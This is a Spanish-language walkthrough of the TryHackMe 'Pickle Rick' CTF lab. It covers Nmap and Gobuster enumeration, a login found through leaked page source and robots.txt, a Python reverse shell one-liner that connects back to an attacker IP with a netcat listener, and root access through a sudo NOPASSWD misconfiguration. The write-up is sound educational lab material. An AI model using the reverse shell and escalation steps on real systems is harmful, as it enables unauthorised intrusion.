[Pickle_Rick](https://tryhackme.com/room/picklerick)
# TryHackMe — Pickle Rick

## 1. Resumen de la Máquina

**Máquina:** Pickle Rick  
**Plataforma:** TryHackMe  
**Tipo de entorno:** Laboratorio/CTF controlado  
**Sistema identificado:** Ubuntu Linux  
**Objetivo:** Enumerar los servicios expuestos, obtener acceso inicial mediante la aplicación web, conseguir una shell sobre el sistema y realizar una escalada de privilegios hasta `root`.

### Cadena de ataque observada

El recorrido documentado en las notas fue:

1. Escaneo inicial con **Nmap** para identificar puertos y servicios.
2. Enumeración del servicio HTTP mediante la página principal y su código fuente.
3. Descubrimiento de recursos web con **Gobuster**.
4. Identificación de `robots.txt` y `login.php`.
5. Uso de un usuario filtrado en el código fuente junto con la información de `robots.txt` para acceder al portal.
6. Obtención de una consola de comandos dentro de la aplicación web.
7. Identificación de `python3` y creación de una **reverse shell** hacia la máquina atacante.
8. Lectura de archivos accesibles como `www-data` y búsqueda de los ingredientes restantes.
9. Descubrimiento de otro ingrediente en `/home/rick`.
10. Enumeración de privilegios mediante `sudo -l`.
11. Descubrimiento de la configuración crítica `(ALL) NOPASSWD: ALL`.
12. Uso de `sudo bash -i` para obtener una shell como `root`.
13. Acceso a `/root` y localización de `3rd.txt`.

> **Nota sobre la evidencia:** las notas contienen los comandos y salidas de terminal disponibles, pero algunas salidas finales no quedaron registradas. En particular, la salida de `cat "second ingredients"` y `cat 3rd.txt` no aparece en el PDF. Por ello, este write-up explica el procedimiento sin inventar el contenido de esos archivos.

---

## 2. Fase de Reconocimiento

### 2.1 Escaneo inicial con Nmap

El primer paso fue determinar qué puertos TCP estaban expuestos y qué servicios estaban ejecutándose en ellos.

```bash
nmap -sCV 10.67.185.106 -Pn
```

### ¿Qué hace cada parámetro?

| Parámetro | Función |
|---|---|
| `-sC` | Ejecuta los scripts NSE (Nmap Scripting Engine) pertenecientes al conjunto de scripts predeterminado. |
| `-sV` | Intenta identificar la versión del servicio que está escuchando en cada puerto abierto. |
| `-Pn` | Omite el descubrimiento de host mediante ICMP/sondeos de disponibilidad y trata al objetivo como activo. |
| `10.67.185.106` | Dirección IP objetivo. |

`-sCV` es simplemente una forma compacta de utilizar `-sC` y `-sV` conjuntamente.

### Resultado

El escaneo mostró:

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
80/tcp open  http  Apache httpd 2.4.41 (Ubuntu)
```

También se identificó el sistema como Linux/Ubuntu.

### Interpretación

Los dos servicios relevantes eran:

- **22/TCP — SSH:** proporciona acceso remoto mediante Secure Shell. En este punto no había evidencia suficiente en las notas para intentar una explotación directa de SSH.
- **80/TCP — HTTP:** ejecutaba Apache 2.4.41 y presentaba una página web. Este servicio se convirtió en el principal objetivo de enumeración.

El título HTTP obtenido fue:

```text
Rick is sup4r cool
```

Esto ya proporciona una pista de que la aplicación web está relacionada con Rick, pero por sí sola no constituye una vulnerabilidad.

---

### 2.2 Inspección del código fuente

Al acceder a:

```text
http://10.67.185.106:80
```

se revisó el código fuente de la página mediante `Ctrl+U`.

La inspección del HTML permitió encontrar la filtración de un **nombre de usuario**.

### ¿Por qué revisar el código fuente?

El código HTML enviado al navegador puede contener información que no aparece visualmente en la página. Durante una evaluación web es habitual revisar:

- Comentarios HTML.
- Nombres de usuarios.
- Rutas internas.
- Referencias a archivos JavaScript.
- Endpoints ocultos visualmente.
- Pistas dejadas accidentalmente por desarrolladores.
- Información de depuración.

En este caso, el código fuente proporcionó un usuario que posteriormente resultó útil para autenticarse en el portal.

---

### 2.3 Enumeración de directorios y archivos con Gobuster

Después se utilizó Gobuster para ampliar la superficie de ataque de la aplicación web:

```bash
gobuster dir -u http://10.67.185.106:80 -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html,bak
```

> **Corrección conceptual:** Gobuster no está escaneando el "puerto" como tal. Nmap se utilizó para identificar el puerto 80; Gobuster está realizando **enumeración de contenido web** sobre ese servicio.

### Desglose del comando

| Parte | Función |
|---|---|
| `gobuster` | Ejecuta la herramienta de enumeración. |
| `dir` | Selecciona el modo de enumeración de directorios/archivos web. |
| `-u` | Define la URL objetivo. |
| `http://10.67.185.106:80` | Servicio web que se quiere enumerar. |
| `-w` | Especifica la wordlist que se utilizará. |
| `/usr/share/wordlists/dirb/common.txt` | Lista de nombres comunes de directorios y archivos. |
| `-t 40` | Utiliza 40 hilos/conexiones concurrentes para realizar las peticiones. |
| `-x` | Añade extensiones que se probarán para cada entrada de la wordlist. |
| `php,txt,html,bak` | Extensiones buscadas. |

La opción `-x` es especialmente útil cuando queremos descubrir archivos como:

```text
login.php
config.php
backup.bak
notes.txt
index.html
```

en lugar de buscar solamente directorios.

### Resultados relevantes

Entre los resultados aparecieron:

```text
/assets        (301)
/denied.php    (302 -> /login.php)
/index.html    (200)
/login.php     (200)
/portal.php    (302 -> /login.php)
/robots.txt    (200)
/server-status (403)
```

### Interpretación de los códigos HTTP

| Código | Significado | Interpretación en este caso |
|---|---|---|
| `200` | OK | El recurso existe y respondió correctamente. |
| `301` | Moved Permanently | Redirección permanente; `/assets` redirigió a `/assets/`. |
| `302` | Found / redirección temporal | El recurso redirigió al usuario a otra ubicación; `portal.php` enviaba al login. |
| `403` | Forbidden | El servidor conoce el recurso pero deniega el acceso. |

Los resultados más interesantes fueron `login.php` y `robots.txt`.

---

### 2.4 `robots.txt`

Al acceder a:

```text
/robots.txt
```

se encontró una frase que, según las notas, se utilizó posteriormente durante la autenticación.

`robots.txt` es un archivo utilizado normalmente para indicar a los rastreadores qué partes de un sitio deberían o no ser indexadas. **No es un mecanismo de seguridad.**

Por ese motivo, durante una evaluación de seguridad siempre merece la pena revisarlo: puede revelar rutas, nombres de recursos o, como ocurre en determinados laboratorios, información dejada como pista.

---

### 2.5 Acceso al portal

Con el usuario encontrado en el código fuente y la frase obtenida de `robots.txt`, se consiguió acceder a:

```text
/login.php
```

La autenticación permitió entrar al portal.

Una vez autenticado apareció una **consola de comandos** que permitía interactuar con el sistema y acceder a determinados archivos/directorios.

Este punto es importante porque representa el cambio entre la simple enumeración web y la ejecución de comandos en el servidor.

---

## 3. Explotación y Acceso Inicial

### 3.1 Enumeración desde la consola web

Una vez obtenida la consola, se ejecutó:

```bash
ls -l
```

### ¿Qué hace?

- `ls` lista archivos y directorios.
- `-l` muestra información detallada, incluyendo permisos, propietario, grupo, tamaño y fecha.

La salida mostró, entre otros:

```text
-rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10 2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10 2019 assets
-rwxr-xr-x 1 ubuntu ubuntu 54 Feb 10 2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10 2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10 2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10 2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10 2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu 17 Feb 10 2019 robots.txt
```

El archivo que inicialmente resultaba especialmente interesante era:

```text
Sup3rS3cretPickl3Ingred.txt
```

Sin embargo, desde la consola web no se pudo leer inicialmente.

---

### 3.2 Identificación de Python

Para buscar una alternativa que permitiera obtener una shell interactiva se comprobó la ubicación de Python:

```bash
which python3
```

`which` busca el ejecutable dentro de las rutas definidas en el `PATH`.

La razón para comprobar esto es que Python puede utilizarse para crear conexiones de red y ejecutar procesos del sistema. Si está disponible en el objetivo, puede servir para establecer una reverse shell en un laboratorio autorizado.

---

### 3.3 Reverse shell mediante Python

La reverse shell utilizada fue:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.128.13",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Y en la máquina atacante se dejó un listener:

```bash
nc -nlvp 443
```

### Desglose de la reverse shell

#### `python3 -c`

```text
-c
```

indica a Python que ejecute directamente el código proporcionado como argumento.

#### `import socket`

Carga el módulo `socket`, que permite crear comunicaciones de red desde Python.

#### Creación del socket

```python
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
```

Aquí:

- `AF_INET` indica IPv4.
- `SOCK_STREAM` indica una comunicación orientada a conexión, normalmente TCP.

#### Conexión hacia el atacante

```python
s.connect(("192.168.128.13",443))
```

El servidor comprometido inicia una conexión TCP hacia la máquina atacante.

Este es el principio de una **reverse shell**: en lugar de que el atacante tenga que conectarse directamente al servidor, el servidor inicia una conexión de salida hacia el atacante.

Esto puede resultar útil en laboratorios porque las conexiones entrantes al objetivo pueden estar restringidas, mientras que las conexiones salientes pueden estar permitidas.

#### Redirección de entrada y salida

```python
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
```

Los descriptores estándar de Unix son:

| Descriptor | Nombre |
|---|---|
| `0` | stdin — entrada estándar |
| `1` | stdout — salida estándar |
| `2` | stderr — salida de errores |

`dup2()` hace que esos descriptores utilicen el socket.

Como resultado, la entrada que llega desde la conexión puede convertirse en entrada para la shell y la salida de la shell se devuelve por esa misma conexión.

#### Ejecución de `/bin/sh`

```python
subprocess.call(["/bin/sh","-i"])
```

Ejecuta una shell `/bin/sh` en modo interactivo.

---

### 3.4 Listener con Netcat

En la máquina atacante:

```bash
nc -nlvp 443
```

Desglose:

| Parámetro | Función |
|---|---|
| `-n` | Evita resolver nombres DNS. |
| `-l` | Activa el modo escucha (listen). |
| `-v` | Muestra información adicional de la conexión. |
| `-p 443` | Utiliza el puerto local 443. |

La salida registrada fue:

```text
Listening on 0.0.0.0 443
Connection received on 10.67.185.106 44158
/bin/sh: 0: can't access tty; job control turned off
$
```

La línea:

```text
Connection received
```

confirma que la conexión desde el objetivo llegó al listener.

El mensaje:

```text
can't access tty; job control turned off
```

es normal en una reverse shell básica: se tiene una shell, pero no una terminal interactiva completa (TTY).

---

### 3.5 Confirmación del usuario actual

Se ejecutó:

```bash
whoami
```

Resultado:

```text
www-data
```

Esto confirma que los comandos estaban siendo ejecutados con la identidad del usuario utilizado por el servidor web.

`www-data` es comúnmente utilizado por servidores web en sistemas Linux para ejecutar procesos web con privilegios reducidos.

En términos de seguridad, esto significa que se había conseguido **ejecución de comandos en el servidor**, pero todavía no se disponía de privilegios administrativos.

---

### 3.6 Lectura del primer ingrediente

Una vez obtenida la shell se pudo leer:

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

`cat` muestra el contenido de un archivo en la salida estándar.

Las notas muestran que el archivo era accesible desde la shell, aunque el contenido concreto no quedó registrado en el PDF.

---

### 3.7 Análisis de `clue.txt`

También se ejecutó:

```bash
cat clue.txt
```

La salida registrada fue:

```text
Look around the file system for the other ingredient.
```

La instrucción indicaba que el siguiente objetivo debía buscarse fuera del directorio actual.

---

### 3.8 Búsqueda en `/home`

Se accedió a:

```bash
cd /home
ls -l
```

La salida fue:

```text
drwxrwxrwx 2 root root 4096 Feb 10 2019 rick
drwxr-xr-x 5 ubuntu ubuntu 4096 Jul 11 2024 ubuntu
```

La existencia de:

```text
/home/rick
```

era especialmente relevante porque correspondía al nombre utilizado durante la enumeración web.

Se accedió posteriormente a:

```bash
cd rick
ls -l
```

y apareció:

```text
-rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients
```

El nombre contiene un espacio, por lo que debe tratarse correctamente desde la shell.

---

### 3.9 Manejo de nombres de archivo con espacios

El primer intento fue:

```bash
cd second ingredients
```

La shell interpretó `second` e `ingredients` como argumentos separados y produjo:

```text
cd: can't cd to second
```

Después se intentó:

```bash
cat second ingredients
```

y `cat` interpretó ambos términos como archivos diferentes:

```text
cat: second: No such file or directory
cat: ingredients: No such file or directory
```

La forma correcta utilizada posteriormente fue:

```bash
cat "second ingredients"
```

Las comillas hacen que toda la cadena sea interpretada como un único nombre de archivo.

> **Importante:** el PDF conserva el comando `cat "second ingredients"`, pero no conserva su salida. Por tanto, el contenido del segundo ingrediente no debe reconstruirse ni inventarse a partir de información externa.

---

## 4. Escalada de Privilegios

### 4.1 Intento de acceso a `/root`

Antes de realizar la comprobación de privilegios, se intentó:

```bash
cd root
```

desde `/home`, lo que produjo:

```text
cd: can't cd to root
```

Esto es esperado porque `root` no es un directorio ubicado directamente dentro de `/home`.

El directorio administrativo correcto es:

```text
/root
```

pero el acceso depende de los permisos del usuario actual.

---

### 4.2 Enumeración de privilegios con `sudo -l`

La comprobación crítica fue:

```bash
sudo -l
```

### ¿Qué hace?

`sudo -l` muestra los comandos que el usuario actual tiene autorizados para ejecutar mediante `sudo`.

La salida fue:

```text
User www-data may run the following commands on ip-10-67-149-225:
    (ALL) NOPASSWD: ALL
```

Este resultado es la vulnerabilidad de escalada de privilegios utilizada en la máquina.

---

### 4.3 ¿Por qué `(ALL) NOPASSWD: ALL` es crítico?

La entrada:

```text
(ALL) NOPASSWD: ALL
```

puede interpretarse de la siguiente manera:

- `(ALL)` indica que los comandos pueden ejecutarse como otros usuarios permitidos, incluido `root`.
- `NOPASSWD` indica que no se requiere introducir una contraseña para esa autorización.
- `ALL` indica que no existe una restricción de comandos específica en esa regla.

En este caso, la combinación proporciona a `www-data` la capacidad de ejecutar comandos mediante `sudo` sin contraseña y, de acuerdo con la regla mostrada, hacerlo con privilegios de `root`.

Por tanto, no fue necesario explotar una vulnerabilidad del kernel, realizar una técnica compleja de explotación de `sudo` ni buscar un binario SUID: la configuración de `sudoers` ya concedía el privilegio necesario.

---

### 4.4 Obtención de shell como root

Se ejecutó:

```bash
sudo bash -i
```

### Desglose

```text
sudo
```

solicita ejecutar el comando con privilegios elevados según la política configurada.

```text
bash
```

inicia Bash.

```text
-i
```

solicita una shell interactiva.

Debido a:

```text
(ALL) NOPASSWD: ALL
```

el comando pudo ejecutarse con privilegios de administrador.

La salida confirmó la transición:

```text
root@ip-10-67-149-225:/home#
```

El prompt `root@...` indica que la shell actual pertenece al usuario `root`.

Los mensajes:

```text
bash: cannot set terminal process group
bash: no job control in this shell
```

se explican por el hecho de que la shell se estaba ejecutando dentro de la reverse shell, que no disponía de un TTY completo.

---

### 4.5 Acceso a `/root`

Desde la shell elevada se utilizó:

```bash
cd /root
ls -l
```

Ahora el acceso fue posible porque la sesión tenía privilegios de `root`.

La salida mostró:

```text
-rw-r--r-- 1 root root 29 Feb 10 2019 3rd.txt
drwxr-xr-x 4 root root 4096 Jul 11 2024 snap
```

El archivo:

```text
3rd.txt
```

era el último archivo relevante identificado en la máquina.

Finalmente se ejecutó:

```bash
cat 3rd.txt
```

Sin embargo, **la salida del comando no está presente en las notas proporcionadas**, por lo que el contenido del tercer ingrediente no puede documentarse con precisión a partir de esta evidencia.

---

# Conclusión técnica

La resolución documentada siguió una cadena de ataque relativamente directa:

```text
Reconocimiento
    │
    ├── Nmap
    │     ├── 22/tcp SSH
    │     └── 80/tcp HTTP
    │
    ├── Inspección del código fuente
    │     └── Usuario filtrado
    │
    └── Gobuster
          ├── login.php
          └── robots.txt
                │
                └── Información utilizada para autenticación
                         │
                         ▼
                 Consola web
                         │
                         ▼
                 Ejecución de comandos
                         │
                         ├── which python3
                         │
                         └── Reverse shell
                                │
                                ▼
                             www-data
                                │
                                ├── Enumeración de archivos
                                ├── Sup3rS3cretPickl3Ingred.txt
                                ├── clue.txt
                                └── /home/rick/second ingredients
                                │
                                ▼
                           sudo -l
                                │
                                ▼
                      (ALL) NOPASSWD: ALL
                                │
                                ▼
                         sudo bash -i
                                │
                                ▼
                              root
                                │
                                ▼
                           /root/3rd.txt
```

### Lecciones técnicas principales

1. **El reconocimiento inicial permite priorizar objetivos.**  
   Nmap permitió identificar que HTTP era un servicio relevante para continuar la investigación.

2. **El código fuente forma parte de la superficie de ataque.**  
   Información que no aparece visualmente en una página puede estar presente en el HTML.

3. **`robots.txt` no debe considerarse un mecanismo de protección.**  
   Su contenido puede revelar información que un atacante puede utilizar.

4. **La enumeración de contenido complementa el escaneo de puertos.**  
   Nmap identificó el servicio; Gobuster permitió descubrir recursos concretos dentro de ese servicio.

5. **Una consola web puede convertirse en un punto de acceso al sistema operativo.**  
   La ejecución de comandos permitió pasar de la aplicación web a una shell del sistema.

6. **Una reverse shell proporciona un canal de interacción más flexible.**  
   En este caso, Python creó una conexión TCP de salida y conectó los descriptores estándar de la shell al socket.

7. **Siempre hay que identificar el contexto de ejecución.**  
   `whoami` confirmó que la shell inicial pertenecía a `www-data`, no a `root`.

8. **`sudo -l` es una comprobación fundamental durante la enumeración local.**  
   Permitió descubrir que `www-data` podía ejecutar cualquier comando mediante `sudo` sin contraseña.

9. **La escalada final se produjo por una mala configuración de privilegios.**  
   La regla `(ALL) NOPASSWD: ALL` eliminó la necesidad de explotar otro componente del sistema.

10. **La evidencia debe conservarse completa.**  
    En esta documentación faltan las salidas de `cat "second ingredients"` y `cat 3rd.txt`; un write-up técnico no debería inventar esos valores.

## Evidencia de comandos clave

### Reconocimiento

```bash
nmap -sCV 10.67.185.106 -Pn
```

### Enumeración web

```bash
gobuster dir -u http://10.67.185.106:80 -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,txt,html,bak
```

### Identificación de Python

```bash
which python3
```

### Listener

```bash
nc -nlvp 443
```

### Confirmación de usuario

```bash
whoami
```

### Enumeración local

```bash
ls -l
cat clue.txt
cd /home
ls -l
cd rick
ls -l
```

### Lectura de archivo con espacio

```bash
cat "second ingredients"
```

### Enumeración de privilegios

```bash
sudo -l
```

### Escalada

```bash
sudo bash -i
```

### Acceso a los archivos de root

```bash
cd /root
ls -l
cat 3rd.txt
```

> **Nota de reproducibilidad:** las direcciones IP que aparecen en las notas no son completamente consistentes: la reverse shell documentada utiliza `192.168.128.13` como IP de conexión del atacante, mientras que posteriormente la salida muestra el objetivo como `10.67.149.225`. Se conservan los valores originales en lugar de modificarlos o asumir que representan exactamente la misma sesión de laboratorio.
